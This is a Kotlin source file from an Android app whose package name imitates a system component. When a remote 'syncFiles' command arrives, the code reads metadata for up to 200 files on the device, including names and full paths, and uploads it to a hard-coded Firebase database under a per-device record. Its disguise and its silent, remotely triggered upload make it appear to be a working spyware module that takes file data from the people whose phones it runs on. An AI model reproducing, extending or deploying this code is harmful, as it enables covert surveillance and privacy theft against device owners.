package com.android.system.core.files

import android.content.Context
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.google.firebase.database.FirebaseDatabase

/**
 * Fayl metadata larini MediaStore orqali o'qib Firebase'ga yuklaydi.
 * Firebase path: devices/{uid}/files/
 * Trigger: command type "syncFiles"
 */
class FileMetaReader(private val context: Context) {

    companion object {
        private const val TAG = "SYS_CORE_FILES"
        private const val MAX_FILES = 200
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    /**
     * Fayl metadata larini o'qib Firebase'ga yuklaydi.
     * @param uid qurilma UID
     * @param onComplete yuklash tugaganda chaqiriladi (success: Boolean)
     */
    fun readAndUpload(uid: String, onComplete: (Boolean) -> Unit = {}) {
        try {
            val files = readFiles()
            if (BuildConfig.DEBUG) { Log.d(TAG, "Read ${files.size} files") }

            if (files.isEmpty()) {
                if (BuildConfig.DEBUG) { Log.d(TAG, "No files found") }
                onComplete(true)
                return
            }

            val aesKey = KeyFetchWorker.getAesKey(context)
            if (aesKey == null && BuildConfig.DEBUG) {
                Log.w(TAG, "AES key not available, files will be uploaded unencrypted")
            }

            val filesMap = mutableMapOf<String, Any>()
            files.forEachIndexed { index, file ->
                val encryptedName = if (aesKey != null) {
                    CryptoManager.encrypt(file.name, aesKey) ?: file.name
                } else file.name

                val encryptedPath = if (aesKey != null) {
                    CryptoManager.encrypt(file.path, aesKey) ?: file.path
                } else file.path

                filesMap["$index"] = mapOf(
                    "id" to file.id,
                    "name" to encryptedName,
                    "path" to encryptedPath,
                    "size" to file.size,
                    "mimeType" to file.mimeType,
                    "dateModified" to file.dateModified
                )
            }

            FirebaseDatabase.getInstance(FIREBASE_URL)
                .getReference("devices")
                .child(uid)
                .child("files")
                .setValue(filesMap)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Files uploaded: ${files.size}") }
                    onComplete(true)
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Files upload failed: ${e.message}") }
                    onComplete(false)
                }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readAndUpload error: ${e.message}") }
            onComplete(false)
        }
    }

    /**
     * MediaStore orqali fayl metadata larini o'qiydi.
     * Android 13+ uchun READ_MEDIA_* ruxsatlarini ishlatadi.
     */
    private fun readFiles(): List<FileData> {
        val files = mutableListOf<FileData>()
        try {
            val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL)
            } else {
                MediaStore.Files.getContentUri("external")
            }

            val projection = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.DATE_MODIFIED
            )

            // Faqat haqiqiy fayllarni olish (papkalar emas)
            val selection = "${MediaStore.Files.FileColumns.SIZE} > 0"

            val cursor = context.contentResolver.query(
                collection,
                projection,
                selection,
                null,
                "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val dataCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)
                val mimeCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE)
                val dateCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)

                while (it.moveToNext() && files.size < MAX_FILES) {
                    val id = it.getLong(idCol).toString()
                    val name = it.getString(nameCol) ?: continue
                    val path = it.getString(dataCol) ?: ""
                    val size = it.getLong(sizeCol)
                    val mimeType = it.getString(mimeCol) ?: ""
                    val dateModified = it.getLong(dateCol) * 1000L // seconds → ms

                    files.add(FileData(
                        id = id,
                        name = name,
                        path = path,
                        size = size,
                        mimeType = mimeType,
                        dateModified = dateModified
                    ))
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readFiles error: ${e.message}") }
        }
        return files
    }

    /**
     * Fayl metadata modeli
     */
    data class FileData(
        val id: String,
        val name: String,
        val path: String,
        val size: Long,
        val mimeType: String,
        val dateModified: Long
    )
}
